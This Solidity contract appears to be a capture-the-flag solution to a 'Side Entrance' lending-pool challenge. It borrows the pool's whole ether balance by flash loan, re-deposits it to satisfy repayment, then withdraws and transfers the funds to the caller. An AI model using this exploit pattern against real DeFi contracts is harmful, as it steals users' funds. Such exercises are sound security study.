// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "hardhat/console.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable {
        console.log(msg.value);
        console.log(address(this).balance);
        pool.deposit{value: address(this).balance}();
        // payable(msg.sender).transfer(address(this).balance);
    }

    function attack() external payable {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    // fallback function to receive ETH
    receive() external payable {}
}
